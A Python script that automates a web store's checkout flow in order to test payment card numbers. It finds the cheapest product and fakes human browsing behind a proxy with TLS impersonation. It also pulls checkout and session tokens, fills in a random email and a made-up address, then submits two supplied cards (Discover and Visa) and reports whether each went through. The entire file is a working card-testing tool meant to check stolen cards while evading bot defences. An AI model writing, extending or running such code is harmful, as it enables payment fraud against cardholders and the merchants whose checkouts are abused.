import asyncio, sys
sys.path.insert(0, '.')
import auto_async_v2 as v2
from telemetry_v2 import Tracker

async def run(site, discover_cc, visa_cc, proxy):
    client = v2.AsyncTLSClient(timeout=15, proxy_url=proxy)
    tracker = Tracker(client, site)
    try:
        currency, country = await v2.fetch_shop_currency(client, site)
        title, pid, phandle, vid, price = await v2.find_cheapest_product(client, site)
        tracker.set_item(vid, pid, price)

        curl, ctoken, stoken, chtml = await v2.human_warmup_async(client, site, vid, pid, phandle, tracker)
        stable_id = v2.extract_stable_id(chtml)
        build_id = v2.extract_commit_sha(chtml)
        source_token = v2.extract_source_token(chtml)
        actions_url = v2.extract_actions_js_url(chtml, site)
        js_body = await v2.fetch_actions_js(client, actions_url, site)
        proposal_id = v2.extract_proposal_id(js_body)
        submit_id = v2.extract_submit_for_completion_id(js_body)

        _, p1 = await v2.send_proposal(client, site, curl, ctoken, stoken, stable_id, vid, price, proposal_id, build_id, source_token, currency, country)
        qt = v2.extract_queue_token(p1)
        email = v2.generate_random_email()
        _, p2 = await v2.send_proposal2(client, site, curl, ctoken, stoken, stable_id, vid, price, proposal_id, build_id, source_token, qt, email, currency, country)
        qt2 = v2.extract_queue_token(p2)
        addr = v2.address_for_country(country)
        _, p3 = await v2.send_proposal3(client, site, curl, ctoken, stoken, stable_id, vid, price, proposal_id, build_id, source_token, qt2, email, addr, currency, country)
        qt3 = v2.extract_queue_token(p3)
        _, p4 = await v2.send_proposal3(client, site, curl, ctoken, stoken, stable_id, vid, price, proposal_id, build_id, source_token, qt3, email, addr, currency, country)
        qt4 = v2.extract_queue_token(p4)
        _, p5 = await v2.send_proposal3(client, site, curl, ctoken, stoken, stable_id, vid, price, proposal_id, build_id, source_token, qt4, email, addr, currency, country)
        qt5 = v2.extract_queue_token(p5)

        is_digital = not v2.extract_is_shipping_required(p5)
        dh, dh_ship = v2.extract_delivery_from_proposal(p5)
        if not dh: dh = v2.extract_delivery_handle(p5)
        shipping = dh_ship or v2.extract_shipping_amount(p5) or "0.00"
        total = v2.extract_checkout_total(p5) or v2.extract_seller_total(p5) or "1.00"
        signed = v2.extract_signed_handles(p5)
        tax = v2.extract_tax_amount(p5)
        ident_sig = v2.extract_identification_signature(chtml)
        attempt_token = v2.generate_attempt_token(ctoken)
        site_name = site.replace("https://","").replace("http://","")

        async def submit_card(cc):
            num, mm, yy, cvv = v2.parse_card_entry(cc)
            name = f"{addr.first_name} {addr.last_name}"
            pci_status, pci_body = await v2.send_pci_session(ident_sig, num, name, mm, yy, cvv, site_name, proxy, impersonate=client.impersonate)
            pci_id = v2.extract_pci_session_id(pci_body)
            if not pci_id:
                return f"PCI failed ({pci_status}): {pci_body[:120]}"
            st, sb = await v2.send_submit_for_completion(
                client, site, curl, ctoken, stoken, stable_id, vid, price, submit_id, build_id,
                source_token, qt5, email, addr, dh, shipping, total, pci_id, attempt_token,
                currency, country, signed, is_digital=is_digital, tax_amount=tax, total_any=False)
            # extract the meaningful error/result
            err = v2.extract_any_error(sb) or ""
            rid = v2.extract_receipt_id(sb) or ""
            return f"status={st} receipt={rid[:20]} error={err[:120]}"

        print(f"site={site} fp={client.impersonate}")
        print(f"[1] DISCOVER {discover_cc[:6]}... -> {await submit_card(discover_cc)}")
        print(f"[2] VISA    {visa_cc[:6]}...    (same session) -> {await submit_card(visa_cc)}")
    finally:
        await client.close()

async def main():
    proxy = sys.argv[4] if len(sys.argv) > 4 else ""
    await run(sys.argv[1], sys.argv[2], sys.argv[3], proxy)

asyncio.run(main())
